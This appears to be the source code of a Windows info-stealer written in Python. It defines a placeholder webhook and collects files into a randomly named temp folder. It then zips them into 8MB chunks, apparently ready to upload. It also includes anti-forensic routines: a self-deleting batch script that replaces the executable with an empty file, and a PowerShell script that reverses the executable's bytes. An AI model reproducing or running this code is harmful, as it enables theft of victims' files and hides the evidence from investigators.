import os
import random
import string
import logging
import sys
from random import choices

WEBHOOK = "WEBHOOK_1"

SELF_EXEC_NAME = os.path.basename(sys.argv[0])

bat = f'''
timeout /t 1
fsutil file createnew {SELF_EXEC_NAME} {os.path.getsize(SELF_EXEC_NAME)}
(goto) 2>nul & del "%~f0"
'''

DEBUG_MODE = not SELF_EXEC_NAME[-3:] == 'exe'


def ps1_disposer(randomness=0.1):
    exec_size = os.path.getsize(SELF_EXEC_NAME)
    random_byte_count = round(exec_size * randomness)
    entry_point = random.randint(0, exec_size - random_byte_count - 1)
    exit_point = entry_point + random_byte_count - 1

    ps1 = f'''
$filePath = "{SELF_EXEC_NAME}"

# Read the contents of the file into a variable
$fileContents = Get-Content -Path $filePath -Encoding Byte

$reversedBytes = [System.Array]::Reverse($fileContents)

# Write the modified file contents back to the original file
Set-Content -Path $filePath -Value $reversedBytes -Encoding Byte
    
    '''
    script = "a.ps1"
    with open(script, 'w') as f:
        f.write(ps1)
    os.system(f"powershell.exe .\\{script}")


def random_str_generator(size=5):
    return "".join(choices(string.ascii_letters + string.digits, k=size))


BASE_GATHER_FOLDER = f"{os.environ['TEMP']}\\{random_str_generator()}" if not DEBUG_MODE else "/Gathered/"
USERNAME = os.environ["USERNAME"]


def logger_setup(filename="log.log"):
    file_handler = logging.FileHandler(f"{BASE_GATHER_FOLDER}/log.log")
    formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
    file_handler.setFormatter(formatter)
    logging.basicConfig(level=logging.DEBUG)
    logging.getLogger().addHandler(file_handler)

    logging.info(f"DEBUG_MODE = {DEBUG_MODE}")


def pack_gathered() -> list[str]:
    import zipfile
    paths = []
    temp = os.environ['TEMP']
    folder_path = BASE_GATHER_FOLDER
    zip_file_path = f"{temp}/{random_str_generator()}.zip"
    max_zip_file_size = 8 * 1024 * 1024  # 8MB
    zip_file = zipfile.ZipFile(zip_file_path, "w")

    # Walk through the folder and add its contents to the ZIP file
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            file_path = os.path.join(root, file)
            if os.path.getsize(file_path) > max_zip_file_size:
                continue
            zip_file.write(file_path, file_path[len(temp):])
            # Check if the ZIP file is larger than the maximum size
            if zip_file.fp.tell() > max_zip_file_size:
                # If it is, close the current ZIP file and open a new one
                zip_file.close()
                paths.append(zip_file_path)
                zip_file_path = f"{os.environ['TEMP']}/{random_str_generator()}.zip"
                zip_file = zipfile.ZipFile(zip_file_path, "w")
    paths.append(zip_file_path)
    zip_file.close()
    return paths
